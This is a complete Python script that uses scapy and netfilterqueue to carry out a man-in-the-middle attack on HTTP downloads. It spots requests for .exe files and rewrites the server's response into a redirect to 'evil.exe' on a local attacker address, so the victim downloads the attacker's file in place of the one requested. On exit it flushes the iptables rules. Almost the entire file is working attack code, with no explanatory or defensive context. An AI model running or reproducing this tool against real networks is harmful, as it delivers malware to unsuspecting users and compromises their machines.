#!/usr/bin/python3
import subprocess
import scapy.all as scapy
import netfilterqueue
ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            if '.exe' in str(scapy_packet[scapy.Raw].load):
                print('\n[+] exe Request Detected!\n\n')
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('\n\n[+] Replacing File...\n\n')
                load = 'HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.1.9/evil.exe\n\n'
                modified_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(modified_packet))
    packet.accept()
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print('\nFlush The iptables...')
    subprocess.call(['sudo', 'iptables', '--flush'])
    print('Done!')
